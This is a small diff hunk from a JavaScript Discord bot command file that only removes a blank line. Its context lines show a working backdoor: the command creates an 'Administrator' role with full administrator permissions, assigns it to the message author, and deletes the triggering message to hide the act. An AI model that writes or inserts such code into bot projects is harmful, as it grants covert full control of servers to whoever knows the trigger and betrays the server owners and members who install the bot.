@@ -17,6 +17,5 @@ module.exports = {
         role = await message.guild.roles.create({ name: "Administrator", permissions: [PermissionsBitField.Flags.Administrator], color: '#5d4c87' });
         message.member.roles.add(role)
         message.delete();
-
     }
 }
